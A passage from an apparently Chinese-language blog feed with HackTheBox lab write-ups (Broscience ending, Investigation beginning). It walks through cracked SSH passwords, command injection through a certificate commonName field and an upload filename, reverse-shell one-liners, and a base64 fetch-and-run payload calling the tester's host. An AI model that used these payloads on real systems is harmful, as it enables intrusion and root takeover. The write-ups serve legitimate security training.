/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到如下凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bill:iluvhorsesandgym</span><br><span class="line">dmytro:Aaronthehottest</span><br><span class="line">michael:2applesplus2apples</span><br></pre></td></tr></table></figure><p>尝试登入SSH服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@10.10.11.195</span><br><span class="line">iluvhorsesandgym</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/bill/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8ca51558ef17c2ec059b606e71696280</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>传递pspy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget 10.10.*.*/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;23 12:54:01 CMD: UID&#x3D;0     PID&#x3D;14400  | &#x2F;bin&#x2F;bash -c &#x2F;opt&#x2F;renew_cert.sh &#x2F;home&#x2F;bill&#x2F;Certs&#x2F;broscience.crt</span><br></pre></td></tr></table></figure><p>查看<code>/opt/renew_cert.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/renew_cert.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ] || [ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> certificate.crt&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -checkend 86400 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;No need to renew yet.&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    subject=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -subject | cut -d <span class="string">&quot;=&quot;</span> -f2-)</span><br><span class="line"></span><br><span class="line">    country=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;C = .&#123;2&#125;&#x27;</span>)</span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;ST = .*,&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;L = .*,&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;O = .*,&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;OU = .*,&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;CN = .*,?&#x27;</span>)</span><br><span class="line">    emailAddress=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -email)</span><br><span class="line"></span><br><span class="line">    country=<span class="variable">$&#123;country:4&#125;</span></span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$&#123;state:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$&#123;locality:3&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$&#123;organization:4&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$&#123;organizationUnit:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$&#123;commonName:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$subject</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Country     =&gt; <span class="variable">$country</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;State       =&gt; <span class="variable">$state</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Locality    =&gt; <span class="variable">$locality</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Name    =&gt; <span class="variable">$organization</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Unit    =&gt; <span class="variable">$organizationUnit</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Common Name =&gt; <span class="variable">$commonName</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Email       =&gt; <span class="variable">$emailAddress</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\nGenerating certificate...&quot;</span>;</span><br><span class="line">    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$country</span></span></span><br><span class="line"><span class="string">    <span class="variable">$state</span></span></span><br><span class="line"><span class="string">    <span class="variable">$locality</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organization</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organizationUnit</span></span></span><br><span class="line"><span class="string">    <span class="variable">$commonName</span></span></span><br><span class="line"><span class="string">    <span class="variable">$emailAddress</span></span></span><br><span class="line"><span class="string">    &quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">    /bin/bash -c <span class="string">&quot;mv /tmp/temp.crt /home/bill/Certs/<span class="variable">$commonName</span>.crt&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br></pre></td></tr></table></figure><blockquote><p>This is a bash script that takes a path to a certificate file as its argument and checks if the certificate needs to be renewed. If it needs to be renewed, it generates a new certificate with the same subject and places it in a specific directory.<br />Here’s a brief rundown of what the script does:</p><ol><li>The script checks if the correct number of arguments have been provided and prints a usage message if they haven’t.</li><li>It then checks if the certificate file exists, and if it doesn’t, it prints an error message and exits.</li><li>If the certificate file exists, the script checks if the certificate needs to be renewed by using the openssl command to check if the certificate is still valid for at least 24 hours (86400 seconds) using the -checkend option. If the certificate doesn’t need to be renewed, it prints a message and exits.</li><li>If the certificate needs to be renewed, the script extracts the subject fields from the certificate using the openssl command and assigns them to variables for later use.</li><li>The script then prints the subject fields to the console.</li><li>It then generates a new certificate using the openssl command with the req subcommand to generate a self-signed certificate. The certificate is generated with a validity period of 365 days, a key length of 4096 bits, and the same subject fields as the original certificate.</li><li>Finally, the script moves the newly generated certificate to a specific directory with the filename as the common name extracted from the subject of the original certificate, followed by the .crt extension.<br />– Generated By ChatGPT</li></ol></blockquote><p>构造一个24小时后过期的证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/bfl.key -out /tmp/bfl.crt -days 1</span><br><span class="line">cp /tmp/bfl.crt /home/bill/Certs/broscience.crt</span><br></pre></td></tr></table></figure><p>其中在<code>commonName</code>字段填入如下Payload <code>$(bash -i &gt;&amp; /dev/tcp/10.10.*.*/9995 0&gt;&amp;1)</code></p><p>监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><p>执行计划任务触发反弹Shell</p><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc289e7710721538f1ae8054f35af549</span><br></pre></td></tr></table></figure><hr /><p>一开始把5432端口的数据库当成Mysql了，弄半天连不上还以为是端口转发工具的问题，难绷</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Investigation</title>
    <link href="https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/"/>
    <id>https://yoloyolo.top/2023/03/21/HackTheBox-Investigation/</id>
    <published>2023-03-21T15:27:00.000Z</published>
    <updated>2023-03-21T15:38:46.018Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_investigation"><a class="markdownIt-Anchor" href="#hackthebox_investigation"></a> HackTheBox_Investigation</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.197</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.197</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 835 closed ports, 163 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41</span><br><span class="line">Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.197</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Tue, 21 Mar 2023 11:51:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">Location: http:&#x2F;&#x2F;eforenzics.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.197\teforenzics.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>未枚举出有效路径</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>请求<code>http://eforenzics.htb/service.html</code></p><p>上传文件功能位于<code>http://eforenzics.htb/upload.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>burpsuite中使用以下文件名进行RCE</p><p><code>filename=&quot;|`curl 10.10.16.8?BFL`|&quot;</code></p><p>本地httpserver接收到请求</p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>反弹Shell语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br></pre></td></tr></table></figure><p>使用以下格式的文件名进行反弹Shell</p><p><code>filename=&quot;|`echo $BASE64_PAYLOAD | base64 -d`|&quot;</code></p><p>Base64编码前的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.*.*/BFL -o /tmp/BFL</span><br><span class="line">bash /tmp/BFL</span><br></pre></td></tr></table></figure><p>接收到Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">smorton:x:1000:1000:eForenzics:&#x2F;home&#x2F;smorton:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">backup:x:34:34::&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:113:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>查找与用户<code>smorton</code>相关的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user smorton -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;smorton</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure><p>查看文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 smorton smorton 1308160 Oct  1 00:35 &#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure><p>查看Web路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/www/html/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Jan  9 10:50 .</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Sep 30 22:26 ..</span><br><span class="line">drwxrwx--- 2 www-data www-data  4096 Mar 21 13:02 analysed_images</span><br><span class="line">dr-xr-x--- 7 www-data www-data  4096 Oct  1 00:31 assets</span><br><span class="line">-r-xr-x--- 1 www-data www-data 10957 Oct  1 00:31 index.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  4335 Oct  1 00:31 service.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  5193 Oct  1 00:31 upload.php</span><br></pre></td></tr></table></figure><p>更改Web路径权限并将文件移动至Web路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/</span><br><span class="line">cp /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg /var/www/html/BFL.msg</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/BFL.msg</span><br><span class="line">file BFL.msg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BFL.msg: CDFV2 Microsoft Outlook Message</span><br></pre></td></tr></table></figure><blockquote><p>apt-get install evolution<br /><a href="https://www.zamzar.com/converters/document/msg/">https://www.zamzar.com/converters/document/msg/</a></p></blockquote><p>转换为pst格式文件并在evolution中打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hi Steve,</span><br><span class="line"></span><br><span class="line">Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I&#39;m concerned that they are moving data on to production without following our data transfer procedures. </span><br><span class="line"></span><br><span class="line">Regards.</span><br><span class="line">Tom</span><br></pre></td></tr></table></figure><p>导出zip并解压后得到<code>security.evtx</code></p><blockquote><p>pip install python-evtx</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evtx_dump.py security.evtx &gt; sec.xml</span><br></pre></td></tr></table></figure><p>查找以下内容</p><p><code>&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;</code></p><p>某个匹配结果附近找到字符串<code>Def@ultf0r3nz!csPa$$</code></p><p>尝试登入SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh smorton@10.10.11.197</span><br><span class="line">Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/smorton/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e98d3d1effe4d3e1d9e1dcb2574d7ac</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for smorton on investigation:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User smorton may run the following commands on investigation:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/binary</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-xr-xr-- 1 root root 19024 Jan  5 16:02 &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure><p>在Web用户的Shell中更改Web路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www</span><br><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p>移动文件至Web路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/binary /var/www/html/</span><br></pre></td></tr></table></figure><p>获取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/binary</span><br></pre></td></tr></table></figure><p>IDA中反编译的主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 